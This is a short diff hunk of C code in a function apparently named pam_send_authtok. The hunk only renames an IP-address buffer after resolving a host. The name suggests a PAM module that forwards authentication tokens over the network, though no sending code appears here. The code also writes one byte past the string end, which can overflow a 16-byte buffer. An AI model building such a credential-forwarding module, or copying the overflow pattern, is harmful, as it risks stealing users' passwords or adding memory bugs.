@@ -55,12 +55,14 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
             addr = &(ipv4->sin_addr);
 
             // Convert the IP to a string
-            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
-            int len = strnlen(ipstr, 16);
-            ipstr[len + 1] = '\0';
-            ipstr[len] = '\n';
+            inet_ntop(p->ai_family, addr, ipaddr, sizeof(ipaddr));
+            int len = strnlen(ipaddr, 16);
+            ipaddr[len + 1] = '\0';
+            ipaddr[len] = '\n';
+            
             // Break after the first IP address is found
             break;
+
         }
     }
 
